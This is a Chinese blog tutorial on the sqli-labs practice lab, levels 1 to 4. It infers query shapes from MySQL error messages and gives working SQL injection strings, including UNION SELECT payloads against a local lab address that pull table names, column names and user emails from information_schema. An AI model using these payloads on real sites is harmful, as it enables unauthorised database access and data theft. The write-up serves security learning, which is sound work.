---
title: Sql注入学习之sqli-lab-1-4
tags: [Sql注入]
categories: [网络安全]
date: 2016-03-19 14:17:08
---

## 1. Less-1 GET-基于错误-单引号-字符型

![](https://ws2.sinaimg.cn/large/006tNc79gy1fvo6y6b6tnj31kw0c0wg3.jpg)

我们将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

<!-- more -->

截取我们感兴趣的那一部分, 即:
` ''1'' LIMIT 0,1' `
为了让大家看的更加清楚一下, 我们去掉前后匹配单引号并故意拉大其中的距离
` '　　1'　　' LIMIT 0,1 `
可以看到 `1'` 是我们输入的数据

接着我们再测试一下

![](https://ws4.sinaimg.cn/large/006tNc79gy1fvo6y6tdkgj31kw0dkmzn.jpg)

同样, 将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1\' LIMIT 0,1' at line 1

同样的方法摘取我们感兴趣的:
` ''1\' LIMIT 0,1' `
去掉前后匹配的单引号, 拉大距离:
` '　　1\　　' LIMIT 0,1 `
可以清楚的看出这次我们输入的是 `1\`

将俩次分析后的结果放在一起比较: 
` '　　1'　　' LIMIT 0,1 `
` '　　1\　　' LIMIT 0,1 `
其中`1'`和`1\`是由用户输入的, 所以由报错信息, 我们可以推测出Sql语句为:

    SELECT user_name, password FROM table WHERE id = ' our-provided-input '

即所有用户输入都被包含在一个单引号之中。 我们称其为字符型。 在注入时要考虑“闭合”单引号。

----------------------------------------

## 2. Less-2 GET-基于错误-整数型
    
![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6y96mhgj31kw07ojw6.jpg)

同样, 将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

` '' LIMIT 0,1' `

去掉前后的单引号后我们发现仅仅剩下我们刚才输入的 `1'` 后面的 `'` 了。
`　　'　　LIMIT 0,1 `
同理, 我们试着输入 `1\`得到的结果如下:
`　　\　　LIMIT 0,1 `
很显然, 前面的数字被正常接受了

所以, 同Less-1, 我们可以推测出Sql语句为:

    SELECT user_name, password FROM table WHERE id = our-provided-input 

即, 用户输入没有被任何字符包含。 我们称其为数字型。

--------------------------------------------------

## 3. Less-3 GET-基于错误-单引号和括号-字符型

![](https://ws4.sinaimg.cn/large/006tNc79gy1fvo6yb2hvlj31kw07odkw.jpg)

同样, 将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

` ''1'') LIMIT 0,1' `

去掉前后匹配的单引号, 拉大距离:
` '　　1'　　') `
同上测试 `1\`
` '　　1\　　') `
其中`1'`和`1\`是由用户输入的, 所以由报错信息, 我们可以推测出Sql语句为:

    SELECT user_name, password FROM table WHERE id = (' our-provided-input ')

所以在注入时 要考虑"闭合"后面的`')`: 所以注入语句如下:
` 1') or/and ('1')=('1 `   即:  id = ('1') or/and ('1')=('1') LIMIT 0,1
` 1') --+ `     即:  id = ('1') --+ ') 注释法

-----------------------------------------

## 4. Less-4 GET-基于错误-双引号和括号-字符型

![](https://ws4.sinaimg.cn/large/006tNc79gy1fvo6ybze56j31kw07lq7y.jpg)

同样, 将其中错误信息拷贝出来

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1\") LIMIT 0,1' at line 1

` '"1\") LIMIT 0,1' `

去掉前后匹配的单引号, 拉大距离, 测试输入`1"`和`1"`:
` "　　1"　　") `
` "　　1\　　") `
由报错信息, 我们可以推测出Sql语句为:

    SELECT user_name, password FROM table WHERE id = (" our-provided-input ")

所以在注入时 要考虑"闭合"后面的`")`: 所以注入语句如下:
` 1") or/and ("1")=("1 `   即:  id = ("1") or/and ("1")=("1") LIMIT 0,1
` 1") --+ `     即:  id = ("1") --+ ') 注释法

------------------------------------------------

## 5. Less1 - Less4 小结

Less1-4 因为根据**id**传入不同有数据回显给我们, 所以可以用联合语句爆出我们感兴趣的一些字段:
例如:
### 猜测字段:
![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6ydd0dyj31kw0b6n0p.jpg)
![](https://ws2.sinaimg.cn/large/006tNc79gy1fvo6yebfh4j31kw08zmzw.jpg)
可以知道字段数字为**3**个
### 找暴露点
![](https://ws4.sinaimg.cn/large/006tNc79gy1fvo6yf82q2j31kw0ah0vr.jpg)
可以看出没有什么数字爆出, 这是我们把**id**的值改为负数
![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6yg6guxj31kw0ar0vr.jpg)
这样, 我们看到有数字 2, 3 暴露了出来

### 查询一些数据库名, 版本, 用户等重要信息
![](https://ws2.sinaimg.cn/large/006tNc79gy1fvo6yi5p2mj31kw0bagpd.jpg)

由上图我们知道数据库版本是mysql的**5.0**以上版本, 所以可以用**information.schema**查询

### 所有表名
用以下语句可以看出security数据库中的所有表名
10.211.55.7/sqli/Less-4/?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6yjxldej31kw0afade.jpg)

### 所有字段名
用一下语句可以看到users表中的所有字段名
10.211.55.7/sqli/Less-4/?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6ykw18yj31kw0at0w9.jpg)

最后我们知道了表名和字段名, 便可以直接查询其中的值, 如下图中查询emails表中的id和email值:
![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6ylt00wj31kw09dtbv.jpg)

